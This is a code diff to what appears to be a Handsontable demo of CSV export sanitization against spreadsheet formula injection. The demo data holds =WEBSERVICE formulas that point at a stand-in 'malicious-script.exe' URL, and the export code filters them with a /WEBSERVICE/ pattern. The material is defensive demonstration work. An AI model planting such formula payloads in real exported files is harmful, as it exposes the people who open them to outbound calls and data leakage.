@@ -7,8 +7,12 @@ const container = document.querySelector('#example4')!;
 
 const hot = new Handsontable(container, {
   data: [
-    ['=WEBSERVICE("http://example.com/malicious-script.exe")'],
+    ['https://handsontable.com', '=WEBSERVICE(A1)'],
+    ['https://github.com', '=WEBSERVICE(A2)'],
+    ['http://example.com/malicious-script.exe', '=WEBSERVICE(A3)'],
   ],
+  colHeaders: true,
+  rowHeaders: true,
   height: 'auto',
   autoWrapRow: true,
   autoWrapCol: true,
@@ -28,7 +32,6 @@ document.querySelector('#no-sanitization')!.addEventListener('click', () => {
     filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
     mimeType: 'text/csv',
     rowDelimiter: '\r\n',
-    rowHeaders: true,
   });
 });
 
@@ -43,7 +46,6 @@ document.querySelector('#recommended-sanitization')!.addEventListener('click', (
     filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
     mimeType: 'text/csv',
     rowDelimiter: '\r\n',
-    rowHeaders: true,
     sanitizeValues: true,
   });
 });
@@ -59,7 +61,6 @@ document.querySelector('#regexp-sanitization')!.addEventListener('click', () => 
     filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
     mimeType: 'text/csv',
     rowDelimiter: '\r\n',
-    rowHeaders: true,
     sanitizeValues: /WEBSERVICE/,
   });
 });
@@ -75,9 +76,8 @@ document.querySelector('#function-sanitization')!.addEventListener('click', () =
     filename: 'Handsontable-CSV-file_[YYYY]-[MM]-[DD]',
     mimeType: 'text/csv',
     rowDelimiter: '\r\n',
-    rowHeaders: true,
     sanitizeValues: (value) => {
-      return /WEBSERVICE/.test(value) ? 'REMOVED MALICIOUS CELL CONTENT' : value;
+      return /WEBSERVICE/.test(value) ? 'REMOVED SUSPICIOUS CELL CONTENT' : value;
     },
   });
 });
